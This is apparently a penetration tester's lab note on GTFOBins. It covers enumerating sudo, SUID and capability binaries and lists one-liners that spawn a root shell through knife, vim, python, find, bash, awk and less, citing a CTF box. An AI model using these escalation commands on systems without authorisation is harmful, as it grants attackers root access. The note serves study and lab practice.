
# GTFOBins

**[gtfobins.github.io](https://gtfobins.github.io/)**  -  curated list of Unix binaries that can be abused to bypass local security restrictions. The first place to check when you find a sudoable binary, SUID binary, or capability on a target.

---

## How to Use

1. Find a sudoable binary, SUID file, or capability on target
2. Go to GTFOBins and search the binary name
3. Filter by the relevant category (Sudo, SUID, Capabilities, etc.)
4. Follow the listed command to escalate

---

## Categories

| Category | When It Applies |
|----------|----------------|
| **Sudo** | Binary appears in `sudo -l` output |
| **SUID** | Binary has SUID bit set (`find / -perm -4000`) |
| **Capabilities** | Binary has Linux capabilities (`getcap -r /`) |
| **Shell** | Binary can spawn an interactive shell |
| **File Read** | Binary can read arbitrary files |
| **File Write** | Binary can write to arbitrary files |
| **Reverse Shell** | Binary can establish an outbound connection |

---

## Common Examples

```bash
# knife (Chef Workstation)  -  sudo
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'

# vim  -  sudo
sudo vim -c ':!/bin/sh'

# python  -  sudo
sudo python3 -c 'import os; os.system("/bin/sh")'

# find  -  SUID or sudo
sudo find . -exec /bin/sh \; -quit

# bash  -  SUID (requires -p to preserve effective UID)
/bin/bash -p

# awk  -  sudo
sudo awk 'BEGIN {system("/bin/sh")}'

# less  -  sudo
sudo less /etc/passwd
# then type: !/bin/sh
```

> When a SUID binary spawns a shell, always use `-p` to prevent the shell from dropping root privileges. See [[Linux-Privilege-Escalation#SUID Binaries]].

---

## Seen In

| Box | Binary | Method |
|-----|--------|--------|
| [[Knife]] | `knife` | `sudo knife exec -E 'exec "/bin/sh"'` |
